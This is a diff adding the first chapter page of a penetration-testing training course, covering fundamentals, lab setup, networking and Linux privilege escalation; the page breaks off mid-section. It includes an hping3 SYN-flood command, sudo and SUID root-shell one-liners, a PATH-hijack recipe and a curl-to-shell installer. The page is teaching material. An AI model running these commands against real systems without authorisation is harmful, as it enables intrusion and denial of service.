@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Part 1 — Foundations of VAPT</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="breadcrumb">
+<a href="../index.html">🏠 Home</a> &rsaquo; <strong>Part 1 — Foundations</strong>
+</nav>
+
+<header class="part-header">
+<h1>🟢 PART 1 — FOUNDATIONS OF VAPT</h1>
+<p class="subtitle">From the absolute basics to lab setup, networking, OS mastery, and scripting.</p>
+<div class="chapters">
+<a href="#ch1"><span class="ch-num">1</span> Intro to Cybersecurity &amp; VAPT</a>
+<a href="#ch2"><span class="ch-num">2</span> Setting Up Your VAPT Lab</a>
+<a href="#ch3"><span class="ch-num">3</span> Networking Fundamentals</a>
+<a href="#ch4"><span class="ch-num">4</span> Linux &amp; Windows for Pentesters</a>
+<a href="#ch5"><span class="ch-num">5</span> Scripting — Python, Bash, PowerShell</a>
+</div>
+</header>
+
+<main>
+
+<!-- ============================================== -->
+<h1 id="ch1">📖 Chapter 1 — Introduction to Cybersecurity &amp; VAPT</h1>
+
+<h2>1.1 What is Cybersecurity?</h2>
+<p>Cybersecurity is the practice of protecting systems, networks, programs, devices and data from
+digital attacks, unauthorized access, damage or theft. It encompasses everything from end-user
+awareness to sophisticated cryptographic protocols.</p>
+
+<div class="diagram">
+CYBERSECURITY DOMAIN MAP
+═══════════════════════
+                    ┌─────────────────┐
+                    │  GOVERNANCE     │
+                    │  (Policies,     │
+                    │   Risk, Audit)  │
+                    └────────┬────────┘
+        ┌─────────────────────┼─────────────────────┐
+        ▼                     ▼                     ▼
+┌──────────────┐    ┌──────────────────┐    ┌──────────────────┐
+│  OPERATIONS  │    │   ENGINEERING    │    │    TESTING       │
+│  • SOC       │    │   • Architecture │    │   • VAPT ✅      │
+│  • SIEM      │    │   • DevSecOps    │    │   • Red Team     │
+│  • IR        │    │   • IAM          │    │   • Bug Bounty    │
+└──────────────┘    └──────────────────┘    └──────────────────┘
+                                                    │
+                            ┌───────────────────────┴─────────────┐
+                            ▼                                     ▼
+                    ┌───────────────┐                    ┌───────────────┐
+                    │  VULNERABILITY│                    │ PENETRATION   │
+                    │  ASSESSMENT   │ ────── drives ─── │ TESTING       │
+                    │  (VA)         │                    │ (PT)          │
+                    │  Find issues  │                    │  Exploit them │
+                    └───────────────┘                    └───────────────┘
+</div>
+
+<h2>1.2 Vulnerability Assessment vs Penetration Testing</h2>
+<table>
+<tr><th>Aspect</th><th>Vulnerability Assessment (VA)</th><th>Penetration Testing (PT)</th></tr>
+<tr><td>Goal</td><td>Identify &amp; catalogue vulnerabilities</td><td>Exploit vulnerabilities to gauge real impact</td></tr>
+<tr><td>Depth</td><td>Broad scan</td><td>Deep targeted exploitation</td></tr>
+<tr><td>Output</td><td>Vulnerability list with severity</td><td>Proof-of-concept exploits + business impact</td></tr>
+<tr><td>Frequency</td><td>Quarterly / Continuous</td><td>Annually / Quarterly for critical</td></tr>
+<tr><td>Tools</td><td>Nessus, Qualys, OpenVAS</td><td>Burp, Metasploit, custom exploits</td></tr>
+<tr><td>Skill</td><td>Configuration &amp; tool operation</td><td>Offensive thinking + scripting</td></tr>
+<tr><td>Risk to system</td><td>Low (passive scanning)</td><td>Higher (active exploitation)</td></tr>
+</table>
+
+<h2>1.3 Types of Penetration Testing</h2>
+<h3>1.3.1 By Knowledge Level</h3>
+<table>
+<tr><th>Type</th><th>What Tester Knows</th><th>Realism</th><th>Use Case</th></tr>
+<tr><td><span class="pill pill-r">Black Box</span></td><td>Only public info (domain, IP range)</td><td>Simulates external hacker</td><td>Real-world attack simulation</td></tr>
+<tr><td><span class="pill pill-y">Grey Box</span></td><td>Limited credentials / architecture docs</td><td>Simulates insider or compromised user</td><td>Most corporate engagements</td></tr>
+<tr><td><span class="pill pill-g">White Box</span></td><td>Full source code, network diagrams, creds</td><td>Full coverage</td><td>Source code review + internal audit</td></tr>
+</table>
+
+<h3>1.3.2 By Target</h3>
+<ul>
+  <li><strong>Network Infrastructure Testing</strong> — Routers, switches, firewalls, servers</li>
+  <li><strong>Web Application Testing</strong> — OWASP Top 10, business logic flaws</li>
+  <li><strong>Mobile Application Testing</strong> — iOS &amp; Android binaries</li>
+  <li><strong>Wireless Network Testing</strong> — Wi-Fi, Bluetooth, RF</li>
+  <li><strong>Cloud Configuration Testing</strong> — AWS, Azure, GCP misconfigurations</li>
+  <li><strong>Social Engineering</strong> — Phishing, vishing, physical</li>
+  <li><strong>IoT/OT/ICS Testing</strong> — Industrial systems, embedded</li>
+  <li><strong>API Testing</strong> — REST, GraphQL, SOAP</li>
+  <li><strong>Thick Client Testing</strong> — Desktop applications (Java, .NET, Electron)</li>
+  <li><strong>Container/Kubernetes Testing</strong> — Docker, K8s</li>
+</ul>
+
+<h2>1.4 The VAPT Methodology — Phases Explained</h2>
+<div class="diagram">
+                ┌──────────────────┐
+                │  1. PRE-ENGAGEMENT│
+                │  • Scoping       │
+                │  • NDA / RoE     │
+                │  • Quote         │
+                └────────┬─────────┘
+                         ▼
+                ┌──────────────────┐
+                │  2. RECONNAISSANCE│
+                │  • Passive OSINT │
+                │  • Active scan   │
+                └────────┬─────────┘
+                         ▼
+                ┌──────────────────┐
+                │  3. THREAT MODELLING│
+                │  • Identify assets│
+                │  • Map attack    │
+                │    surface       │
+                └────────┬─────────┘
+                         ▼
+                ┌──────────────────┐
+                │  4. VULNERABILITY │
+                │  ANALYSIS        │
+                │  • Static + Dynamic│
+                └────────┬─────────┘
+                         ▼
+                ┌──────────────────┐
+                │  5. EXPLOITATION │
+                │  • Manual + Tool │
+                │  • Chain exploits│
+                └────────┬─────────┘
+                         ▼
+                ┌──────────────────┐
+                │  6. POST-EXPLOITATION│
+                │  • Priv esc      │
+                │  • Pivot         │
+                │  • Data exfil    │
+                └────────┬─────────┘
+                         ▼
+                ┌──────────────────┐
+                │  7. REPORTING    │
+                │  • Tech + Exec   │
+                │  • Remediation   │
+                └────────┬─────────┘
+                         ▼
+                ┌──────────────────┐
+                │  8. POST-REPORT  │
+                │  • Re-test       │
+                │  • Lessons       │
+                └──────────────────┘
+</div>
+
+<h2>1.5 Key Industry Standards &amp; Frameworks</h2>
+<table>
+<tr><th>Standard</th><th>Owner</th><th>Use</th></tr>
+<tr><td>OWASP Top 10</td><td>OWASP</td><td>Web app critical risks</td></tr>
+<tr><td>OWASP ASVS</td><td>OWASP</td><td>Web app verification checklist</td></tr>
+<tr><td>OWASP MASVS</td><td>OWASP</td><td>Mobile app security standard</td></tr>
+<tr><td>NIST SP 800-115</td><td>NIST</td><td>Technical security testing guide</td></tr>
+<tr><td>PTES</td><td>Community</td><td>Penetration Testing Execution Standard</td></tr>
+<tr><td>OSSTMM</td><td>ISECOM</td><td>Open Source Security Testing Methodology</td></tr>
+<tr><td>CREST</td><td>CREST</td><td>Accreditation for pen-test firms</td></tr>
+<tr><td>NIST CSF</td><td>NIST</td><td>Cybersecurity framework (Identify/Protect/Detect/Respond/Recover)</td></tr>
+<tr><td>MITRE ATT&amp;CK</td><td>MITRE</td><td>Adversary tactics, techniques, procedures</td></tr>
+<tr><td>PCI-DSS</td><td>PCI SSC</td><td>Card data security — mandates pentest</td></tr>
+<tr><td>ISO 27001/27002</td><td>ISO</td><td>ISMS standard</td></tr>
+<tr><td>CIS Critical Controls</td><td>CIS</td><td>Top 18 security controls</td></tr>
+</table>
+
+<h2>1.6 Real-World Scenario: Why VAPT Saved a Company $4M</h2>
+<div class="scenario">
+<h3>📍 Scenario — FinTech Startup "PayX"</h3>
+<p><strong>Background:</strong> PayX, a Bangalore-based fintech startup with 2M users, was weeks from a
+$40M Series B funding round. Their investors demanded a VAPT before the deal.</p>
+<p><strong>The Test:</strong> Grey-box web app pentest + API testing over 10 days.</p>
+
+<p><strong>Critical Findings:</strong></p>
+<ol>
+  <li><span class="cvss">CVSS 9.8</span> — IDOR in transaction API allowed transferring funds between any accounts.</li>
+  <li><span class="cvss">CVSS 9.1</span> — Hardcoded AWS access keys in mobile app APK → S3 bucket with 8M user KYC documents.</li>
+  <li><span class="cvss">CVSS 8.6</span> — Outdated Apache Struts (CVE-2017-5638 — the Equifax bug!).</li>
+</ol>
+
+<p><strong>Impact:</strong> PayX fixed all criticals in 21 days. The investor technical due-diligence passed.
+The Series B closed. Without VAPT, the keys alone could have triggered GDPR/RBI fines &gt;$50M
+and total reputational collapse.</p>
+
+<p><strong>Lesson:</strong> A 10-day VAPT costing $15K saved a $40M raise and prevented a potential
+breach worth &gt;$50M. <strong>ROI: 3,000x.</strong></p>
+</div>
+
+<h2>1.7 Terminology Cheat-Sheet</h2>
+<table>
+<tr><th>Term</th><th>Meaning</th></tr>
+<tr><td>Asset</td><td>Anything of value (server, data, person)</td></tr>
+<tr><td>Threat</td><td>Anything that can exploit a vulnerability</td></tr>
+<tr><td>Vulnerability</td><td>A weakness that can be exploited</td></tr>
+<tr><td>Risk</td><td>Likelihood × Impact</td></tr>
+<tr><td>Exploit</td><td>Code/technique that leverages a vulnerability</td></tr>
+<tr><td>Payload</td><td>Code delivered after successful exploitation</td></tr>
+<tr><td>Zero-Day</td><td>Vulnerability unknown to vendor</td></tr>
+<tr><td>CVE</td><td>Common Vulnerabilities &amp; Exposures ID</td></tr>
+<tr><td>CVSS</td><td>Common Vulnerability Scoring System</td></tr>
+<tr><td>CWE</td><td>Common Weakness Enumeration</td></tr>
+<tr><td>PoC</td><td>Proof of Concept</td></tr>
+<tr><td>Privilege Escalation</td><td>Moving from low to higher access rights</td></tr>
+<tr><td>Lateral Movement</td><td>Moving across systems at same privilege level</td></tr>
+<tr><td>Persistence</td><td>Maintaining access after initial foothold</td></tr>
+<tr><td>Exfiltration</td><td>Stealing data out of the network</td></tr>
+<tr><td>C2</td><td>Command &amp; Control channel</td></tr>
+<tr><td>TTP</td><td>Tactics, Techniques &amp; Procedures</td></tr>
+</table>
+
+
+<!-- ============================================== -->
+<h1 id="ch2">🧪 Chapter 2 — Setting Up Your VAPT Lab</h1>
+
+<h2>2.1 Budget &amp; Hardware Options</h2>
+<table>
+<tr><th>Budget</th><th>Hardware</th><th>Best For</th></tr>
+<tr><td><span class="pill pill-g">$0</span></td><td>Cloud-only — AWS/Azure free tier + GitHub</td><td>Beginners, OSINT, web</td></tr>
+<tr><td><span class="pill pill-y">$300</span></td><td>Raspberry Pi 5 (8GB) + 1TB SSD</td><td>Network pentesting</td></tr>
+<tr><td><span class="pill pill-o">$800</span></td><td>Old laptop + 16GB RAM + 512GB SSD</td><td>Full lab with VMs</td></tr>
+<tr><td><span class="pill pill-r">$2000+</span></td><td>Dedicated workstation + multiple NICs</td><td>Professional engagements</td></tr>
+</table>
+
+<h2>2.2 Recommended Hardware</h2>
+<div class="grid-2">
+<div class="card"><h4>🥇 Optimal Workstation</h4>
+<ul>
+  <li>CPU: AMD Ryzen 7 / Intel i7 (8+ cores)</li>
+  <li>RAM: 32 GB minimum (64 GB ideal)</li>
+  <li>Storage: 1 TB NVMe SSD</li>
+  <li>GPU: Optional (for hash cracking — RTX 3060+)</li>
+  <li>Network: 2 NICs (onboard + USB-Ethernet)</li>
+</ul>
+</div>
+<div class="card"><h4>🥈 Budget Build</h4>
+<ul>
+  <li>Used Dell/ThinkPad (~$250)</li>
+  <li>16 GB RAM upgrade ($40)</li>
+  <li>512 GB SSD ($35)</li>
+  <li>USB Wi-Fi adapter (Alfa AWUS036ACH — $60)</li>
+</ul>
+</div>
+</div>
+
+<h2>2.3 Step-by-Step: Install Kali Linux (Your Primary OS)</h2>
+<div class="box note">
+<strong>🧪 Lab Exercise 2.1 — Install Kali Linux in VirtualBox</strong>
+</div>
+<pre><code class="cmd"># Step 1: Download &amp; install VirtualBox
+# https://www.virtualbox.org/wiki/Downloads
+
+# Step 2: Download Kali Linux ISO (or prebuilt VM)
+# https://www.kali.org/get-kali/#kali-virtual-machines
+
+# Step 3: Create a new VM
+#   - Type: Linux, Debian (64-bit)
+#   - RAM: 4096 MB (4 GB)
+#   - Disk: 80 GB dynamically allocated
+
+# Step 4: Mount ISO, install, login (root / toor)
+
+# Step 5: Update
+<span class="cmd">$ sudo apt update && sudo apt full-upgrade -y</span>
+
+# Step 6: Install additional tools
+<span class="cmd">$ sudo apt install -y bloodhound neo4j gobuster ffuf burpsuite wireshark nmap metasploit-framework crackmapexec evil-winrm</span>
+
+# Step 7: Create non-root user (security best practice)
+<span class="cmd">$ sudo adduser pentester
+$ sudo usermod -aG sudo pentester</span>
+</code></pre>
+
+<h2>2.4 Vulnerable Targets to Practice On</h2>
+<table>
+<tr><th>App</th><th>Type</th><th>Difficulty</th><th>URL / Source</th></tr>
+<tr><td>DVWA</td><td>Web (PHP)</td><td>🟢 Easy</td><td>github.com/digininja/DVWA</td></tr>
+<tr><td>OWASP WebGoat</td><td>Web (Java)</td><td>🟡 Medium</td><td>owasp.org/www-project-webgoat</td></tr>
+<tr><td>bwapp</td><td>Web (PHP)</td><td>🟡 Medium</td><td>sourceforge.net/projects/bwapp</td></tr>
+<tr><td>Mutillidae II</td><td>Web (PHP)</td><td>🟡 Medium</td><td>github.com/webpwnized/mutillidae</td></tr>
+<tr><td>Juice Shop</td><td>Web (Node.js)</td><td>🟢 Easy</td><td>github.com/juice-shop/juice-shop</td></tr>
+<tr><td>HackTheBox / TryHackMe</td><td>Network/Web</td><td>🟠 Hard</td><td>hackthebox.com / tryhackme.com</td></tr>
+<tr><td>VulnHub</td><td>VM-based</td><td>🟠 Hard</td><td>vulnhub.com</td></tr>
+<tr><td>Metasploitable 2/3</td><td>Linux VMs</td><td>🟡 Medium</td><td>sourceforge.net/projects/metasploitable</td></tr>
+<tr><td>VulnHub + HackMyVM</td><td>Linux/Windows</td><td>🔴 Insane</td><td>hackmyvm.eu</td></tr>
+<tr><td>DIVA (Damn Insecure &amp; Vulnerable App)</td><td>Android</td><td>🟢 Easy</td><td>github.com/payatu/diva-android</td></tr>
+<tr><td>InsecureBankv2</td><td>Android</td><td>🟡 Medium</td><td>github.com/dineshshetty/Android-InsecureBankv2</td></tr>
+</table>
+
+<h2>2.5 Deploying a Practice Lab in Docker (Faster!)</h2>
+<pre><code class="cmd"># Install Docker &amp; Docker Compose
+$ curl -fsSL https://get.docker.com | sh
+$ sudo usermod -aG docker $USER
+$ newgrp docker
+
+# Create a vulnerable web lab in 30 seconds
+$ mkdir ~/vulnlab && cd ~/vulnlab
+$ cat > docker-compose.yml &lt;&lt;EOF
+version: '3'
+services:
+  dvwa:
+    image: vulnerables/web-dvwa
+    ports:
+      - "8080:80"
+    environment:
+      - RECAPTCHA_PRIV_KEY=''
+      - RECAPTCHA_PUB_KEY=''
+      - SECURITY_LEVEL=low
+  juiceshop:
+    image: bkimminich/juice-shop
+    ports:
+      - "3000:3000"
+  webgoat:
+    image: webgoat/webgoat
+    ports:
+      - "8081:8080"
+EOF
+
+$ docker-compose up -d
+$ xdg-open http://localhost:8080 # DVWA
+$ xdg-open http://localhost:3000 # Juice Shop
+
+# Tear down when done
+$ docker-compose down</span>
+</code></pre>
+
+<h2>2.6 Essential Browser Configuration</h2>
+<h3>🦊 Firefox for Pentesting</h3>
+<ul>
+  <li>Install <strong>FoxyProxy</strong> — Quick proxy switching to Burp Suite</li>
+  <li>Install <strong>Wappalyzer</strong> — Fingerprint tech stack</li>
+  <li>Install <strong>Cookie Editor</strong> — Manipulate cookies</li>
+  <li>Install <strong>User-Agent Switcher</strong></li>
+  <li>Disable browser cache when testing</li>
+  <li>Use a separate Firefox profile for pentesting</li>
+</ul>
+
+<pre><code class="cmd"># Configure Firefox proxy to Burp (127.0.0.1:8080)
+# Settings → Network → Manual Proxy → HTTP Proxy 127.0.0.1, Port 8080
+# Enable "Use this proxy for HTTPS"
+
+# Install FoxyProxy Standard
+# https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/</span>
+</code></pre>
+
+<h2>2.7 Cloud Lab (Zero Hardware)</h2>
+<div class="box success">
+<strong>🧪 Lab Exercise 2.2 — AWS Free-Tier Cloud Lab</strong>
+</div>
+<pre><code class="cmd"># AWS Free Tier gives you 12 months of t2.micro EC2 + free Kali AMI
+
+# Step 1: Sign up for AWS free tier (aws.amazon.com)
+# Step 2: Launch EC2, search AMI: "kali-linux"
+# Step 3: Generate key pair (.pem)
+# Step 4: SSH into it
+$ chmod 400 kali.pem
+$ ssh -i kali.pem ec2-user@&lt;public-ip&gt;
+
+# Step 5: Free alternatives
+#  - Google Cloud free tier (e2-micro forever)
+#  - Azure free tier (B1S 12 months)
+#  - Oracle Cloud (4 ARM instances for FREE forever!)
+
+# Many seasoned testers use Oracle Cloud's free ARM 4-core 24GB instance
+</code></pre>
+
+<h2>2.8 Lab Architecture Diagram</h2>
+<div class="diagram">
+YOUR VAPT LAB ARCHITECTURE
+══════════════════════════
+
+    ┌──────────────┐        Internet (isolated)
+    │  HOST OS     │         via NAT network
+    │  Windows     │        ┌──────────────┐
+    │  / macOS     │◄──────►│  VPN         │
+    └──────┬───────┘        │  (Optional)  │
+           │                └──────────────┘
+           │
+           ▼
+    ┌──────────────────────────────────────────┐
+    │  VirtualBox / VMware / Hyper-V           │
+    │                                          │
+    │  ┌──────────┐  ┌──────────┐  ┌────────┐  │
+    │  │  KALI   │  │  WINDOWS │  │  WIN   │  │
+    │  │  Linux  │  │  10/11   │  │ Server │  │
+    │  │(attacker│  │(target)  │  │ (DC)   │  │
+    │  └──────────┘  └──────────┘  └────────┘  │
+    │                                          │
+    │  ┌──────────┐  ┌──────────┐  ┌────────┐  │
+    │  │ Metaspl. │  │  DVWA    │  │ Juice  │  │
+    │  │   2/3    │  │  Web App │  │  Shop  │  │
+    │  │(Linux   │  │          │  │        │  │
+    │  │ target)  │  │          │  │        │  │
+    │  └──────────┘  └──────────┘  └────────┘  │
+    │                                          │
+    │  Internal "PentestNet"  192.168.50.0/24 │
+    └──────────────────────────────────────────┘
+</div>
+
+
+<!-- ============================================== -->
+<h1 id="ch3">🌐 Chapter 3 — Networking Fundamentals</h1>
+
+<p>Without solid networking knowledge, you'll be a tool operator, not a tester. This chapter
+gives you the network intelligence you need for every engagement.</p>
+
+<h2>3.1 The OSI Model</h2>
+<table>
+<tr><th>Layer</th><th>Name</th><th>Function</th><th>Attacker Perspective</th></tr>
+<tr><td>7</td><td>Application</td><td>HTTP, FTP, DNS, SMTP</td><td>Web exploits, fuzzing</td></tr>
+<tr><td>6</td><td>Presentation</td><td>SSL/TLS, encryption</td><td>Cert issues, weak ciphers</td></tr>
+<tr><td>5</td><td>Session</td><td>Session management</td><td>Session hijacking</td></tr>
+<tr><td>4</td><td>Transport</td><td>TCP, UDP</td><td>Port scanning, SYN flood</td></tr>
+<tr><td>3</td><td>Network</td><td>IP, routing</td><td>IP spoofing, routing attacks</td></tr>
+<tr><td>2</td><td>Data Link</td><td>ARP, MAC</td><td>ARP poisoning, MAC flooding</td></tr>
+<tr><td>1</td><td>Physical</td><td>Cables, radio</td><td>Wire tapping, evil twin AP</td></tr>
+</table>
+
+<h2>3.2 TCP/IP 3-Way Handshake</h2>
+<div class="diagram">
+TCP 3-WAY HANDSHAKE
+═══════════════════
+
+   CLIENT                              SERVER
+      │                                   │
+      │  ──── SYN (seq=x) ─────────────►  │   ① HANDSHAKE INIT
+      │                                   │
+      │  ◄── SYN-ACK (seq=y, ack=x+1) ── │   ② SYN-ACK
+      │                                   │
+      │  ──── ACK (seq=x+1, ack=y+1) ───► │   ③ ACK
+      │                                   │
+      │  ============= DATA =============►│
+      │                                   │
+</div>
+
+<div class="box danger">
+<strong>⚠ Attacker Tool:</strong> <code>hping3 --flood --syn -p 80 target</code> — SYN flood DoS attack.
+The server queue fills with half-open connections.
+</div>
+
+<h2>3.3 Common Ports You MUST Memorize</h2>
+<table>
+<tr><th>Port</th><th>Service</th><th>Common Findings</th></tr>
+<tr><td>21</td><td>FTP</td><td>Anonymous login, cleartext creds</td></tr>
+<tr><td>22</td><td>SSH</td><td>Weak keys, brute force</td></tr>
+<tr><td>23</td><td>Telnet</td><td>Cleartext creds (legacy!)</td></tr>
+<tr><td>25</td><td>SMTP</td><td>Open relay, VRFY/EXPN enum users</td></tr>
+<tr><td>53</td><td>DNS</td><td>Zone transfer, DNS poisoning</td></tr>
+<tr><td>80/443</td><td>HTTP/HTTPS</td><td>Web app attacks</td></tr>
+<tr><td>110/143</td><td>POP3/IMAP</td><td>Cleartext email creds</td></tr>
+<tr><td>139/445</td><td>SMB</td><td>EternalBlue, shares enumeration</td></tr>
+<tr><td>1433</td><td>MSSQL</td><td>SA brute force, query abuse</td></tr>
+<tr><td>3306</td><td>MySQL</td><td>Root no password</td></tr>
+<tr><td>3389</td><td>RDP</td><td>BlueKeep, brute force</td></tr>
+<tr><td>5432</td><td>PostgreSQL</td><td>Default creds</td></tr>
+<tr><td>5900</td><td>VNC</td><td>Weak/no password auth</td></tr>
+<tr><td>5985</td><td>WinRM HTTP</td><td>CrackMapExec lateral movement</td></tr>
+<tr><td>6379</td><td>Redis</td><td>No auth → RCE</td></tr>
+<tr><td>8000/8080/8443</td><td>HTTP alt</td><td>Admin panels, dashboards</td></tr>
+<tr><td>9200</td><td>Elasticsearch</td><td>Unauthenticated data dumps</td></tr>
+<tr><td>27017</td><td>MongoDB</td><td>No auth → full DB dump</td></tr>
+</table>
+
+<h2>3.4 Subnetting Cheat-Sheet</h2>
+<table>
+<tr><th>CIDR</th><th>Mask</th><th>Hosts</th><th>Common Use</th></tr>
+<tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>Small office LAN</td></tr>
+<tr><td>/25</td><td>255.255.255.128</td><td>126</td><td>Subnetting</td></tr>
+<tr><td>/26</td><td>255.255.255.192</td><td>62</td><td>Subnetting</td></tr>
+<tr><td>/27</td><td>255.255.255.224</td><td>30</td><td>Subnetting</td></tr>
+<tr><td>/28</td><td>255.255.255.240</td><td>14</td><td>Point-to-point</td></tr>
+<tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>Router links</td></tr>
+<tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>Large enterprise</td></tr>
+<tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>ISP / cloud provider</td></tr>
+</table>
+
+<h2>3.5 Practical Commands Every Pentester Uses</h2>
+<pre><code class="cmd"># ──────── Linux ────────
+$ ip a                          # Show all interfaces &amp; IPs
+$ ip route                      # Show routing table
+$ traceroute 8.8.8.8            # Trace path
+$ ping -c 3 target.com          # 3 ping packets
+$ arp -a                        # Show ARP cache
+$ netstat -tuln                 # Listening ports
+$ ss -tulnp                     # Modern netstat
+$ curl -I https://target.com    # HTTP headers
+$ dig axfr @ns1.target.com target.com   # DNS zone transfer attempt
+
+# ──────── Windows ────────
+PS&gt; ipconfig /all
+PS&gt; route print
+PS&gt; tracert 8.8.8.8
+PS&gt; netstat -an
+PS&gt; arp -a
+PS&gt; nslookup -type=any target.com
+</code></pre>
+
+<h2>3.6 DNS Reconnaissance Deep Dive</h2>
+<pre><code class="cmd"># Passive DNS — find historical records
+$ amass enum -passive -d target.com
+$ subfinder -d target.com -silent
+$ assetfinder --subs-only target.com
+
+# Active — brute force subdomains
+$ gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# DNS Zone transfer (AXFR) — try every NS
+$ dig axfr @ns1.target.com target.com
+$ dnsrecon -d target.com -a   # All records
+$ fierce -dns target.com
+
+# Reverse DNS sweep (find hosts on a network)
+$ nmap -sn 192.168.1.0/24
+</code></pre>
+
+<h2>3.7 SSL/TLS Issues Pentesters Love</h2>
+<ul>
+  <li><strong>SSLv2/SSLv3</strong> — Deprecated, should be disabled</li>
+  <li><strong>TLS 1.0/1.1</strong> — Known attacks (BEAST, POODLE)</li>
+  <li><strong>Self-signed certificates</strong> — Trust issues</li>
+  <li><strong>Expired certificates</strong> — Compliance failure</li>
+  <li><strong>Weak cipher suites</strong> — RC4, 3DES, NULL</li>
+  <li><strong>Heartbleed (CVE-2014-0160)</strong> — Memory leak in OpenSSL</li>
+  <li><strong>POODLE, BEAST, CRIME, BREACH</strong> — Protocol-level attacks</li>
+</ul>
+<pre><code class="cmd"># Scan TLS with nmap scripts
+$ nmap -p 443 --script=ssl-enum-ciphers,vuln target.com
+
+# TestSSL.sh — comprehensive
+$ git clone https://github.com/drwetter/testssl.sh
+$ ./testssl.sh https://target.com
+</code></pre>
+
+<div class="box warn">
+<strong>⚠ Real-World Case:</strong> In 2014, Heartbleed leaked private keys from 17% of the
+top 1M websites. A single miss-configured OpenSSL instance could compromise the entire PKI.
+</div>
+
+
+<!-- ============================================== -->
+<h1 id="ch4">💻 Chapter 4 — Linux &amp; Windows for Pentesters</h1>
+
+<h2>4.1 Your Daily Linux Commands</h2>
+<pre><code class="cmd"># ─── File &amp; Directory ───
+$ ls -la                       # List with hidden files
+$ cd /var/www                  # Change dir
+$ pwd                          # Where am I?
+$ mkdir -p a/b/c               # Make nested dirs
+$ cp -r src/ dst/              # Recursive copy
+$ rsync -avz src/ dst/         # Sync w/ progress
+$ find / -name "*.txt" 2&gt;/dev/null  # Find files, suppress errors
+$ locate passwd                # Search db index
+$ which python3                # Find binary location
+$ tree -L 2 /etc               # Visual directory tree
+
+# ─── File viewing ───
+$ cat /etc/passwd
+$ less /var/log/auth.log
+$ head -n 50 file.txt
+$ tail -f /var/log/syslog      # Follow log updates live
+$ grep -ri "password" /etc/    # Case-insensitive recursion
+
+# ─── Permissions ───
+$ chmod 755 script.sh          # rwxr-xr-x
+$ chmod u+w,g+r,o-r file       # Symbolic mode
+$ chown root:root file         # Owner + group
+$ umask                        # Show default mask
+
+# ─── Users &amp; Groups ───
+$ id                           # Current user identity
+$ who                          # Logged-in users
+$ last                         # Login history
+$ sudo -l                      # What can I sudo?
+$ cat /etc/passwd              # List all users
+$ cat /etc/shadow              # Hashed passwords (root only)
+
+# ─── Processes &amp; Services ───
+$ ps aux                       # All processes
+$ top / htop                   # Live process monitor
+$ systemctl list-units         # Systemd services
+$ systemctl status sshd
+$ service nginx start
+
+# ─── Networking ───
+$ ip a                         # Interfaces
+$ ss -tulnp                    # Open ports &amp; owning process
+$ netstat -ano                 # All connections
+$ iptables -L -n -v            # Firewall rules
+$ tcpdump -i eth0 port 80 -w capture.pcap    # Packet capture
+
+# ─── Package Management ───
+$ apt update &amp;&amp; apt install nmap
+$ apt remove --purge nmap
+$ dpkg -l | grep nmap
+$ yum install nmap             # RHEL/CentOS
+$ snap install bloodhound      # Universal packages
+</code></pre>
+
+<h2>4.2 File Permissions Demystified</h2>
+<div class="diagram">
+FILE PERMISSIONS — rwxr-xr--
+═══════════════════════
+
+  -   rwx   r-x   r--
+  │    │    │     │
+  │    │    │     └── Others: read only
+  │    │    └──────── Group: read + execute
+  │    └───────────── Owner: read + write + execute
+  └────────────────── File type (- = file, d = dir, l = link)
+
+  Octal:  r=4 , w=2 , x=1
+          ─────────────
+   rwx  = 4+2+1 = 7
+   r-x  = 4+0+1 = 5
+   r--  = 4+0+0 = 4
+
+  So "rwxr-xr--" = 754
+</div>
+
+<h2>4.3 Linux Privilege Escalation — A Pentester's Goldmine</h2>
+<div class="box danger">
+<strong>⚠ This is the #1 cause of successful pentests:</strong> gaining <em>initial
+foothold</em> is easy, but turning "user" into "root" is what makes you a real tester.
+</div>
+
+<h3>4.3.1 Kernel Exploits</h3>
+<pre><code class="cmd"># Identify kernel version
+$ uname -a
+$ cat /etc/os-release
+
+# Find matching exploit — DirtyPipe, DirtyCow, DirtyCred, etc.
+$ searchsploit linux kernel 5.8
+$ ./linpeas.sh                 # Comprehensive checker from PEASS-ng
+</code></pre>
+
+<h3>4.3.2 SUID/SGID Binaries</h3>
+<pre><code class="cmd"># Find SUID binaries — instant root candidates
+$ find / -perm -u=s -type f 2&gt;/dev/null
+
+# Example dangerous SUID: /usr/bin/python3
+$ ls -la /usr/bin/python3
+-rwsr-xr-x 1 root root /usr/bin/python3   # 's' = SUID
+
+# Exploit — spawn root shell
+<span class="cmd">$ python3 -c 'import os; os.execvp("/bin/sh", ["sh"])'</span>
+# uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<h3>4.3.3 Sudo Misconfigurations</h3>
+<pre><code class="cmd">$ sudo -l
+(ALL) NOPASSWD: /usr/bin/vim
+(ALL) NOPASSWD: /usr/bin/find
+(ALL) NOPASSWD: /usr/bin/python3
+
+# Vim → shell escape
+$ sudo vim -c ':!/bin/sh'
+
+# Find → exec
+$ sudo find . -exec /bin/sh \;
+
+# Python3 sudo with no password → INSTANT ROOT
+$ sudo python3 -c 'import os; os.system("/bin/bash")'
+</code></pre>
+
+<h3>4.3.4 Cron Jobs</h3>
+<pre><code class="cmd">$ cat /etc/crontab
+$ ls -la /etc/cron.*
+$ crontab -l
+
+# Watch writable cron scripts
+$ grep -Rn "CRON" /etc/cron* 2&gt;/dev/null
+</code></pre>
+
+<h3>4.3.5 Path Hijacking</h3>
+<pre><code class="cmd"># Cron calls "service" w/o full path
+$ echo $PATH
+
+# Create malicious "service" in /tmp
+$ echo '/bin/bash' &gt; /tmp/service
+$ chmod +x /tmp/service
+$ export PATH=/tmp:$PATH
+
+# When cron runs "/usr/local/bin/backup.sh" → triggers bash
+</code></pre>
+
+<h3>4.3.6 Tools for Auto-Enumeration</h3>
+<div class="grid-3">
+<div class="card"><h4>LinPEAS</h4><p>github.com/carlospolop/PEASS-ng — LinPEAS.sh</p></div>
+<div class="card"><h4>LinEnum</h4><p>github.com/rebootuser/LinEnum</p></div>
+<div class="card"><h4>LES (Linux Exploit Suggester)</h4><p>github.com/mzet-/les2</p></div>
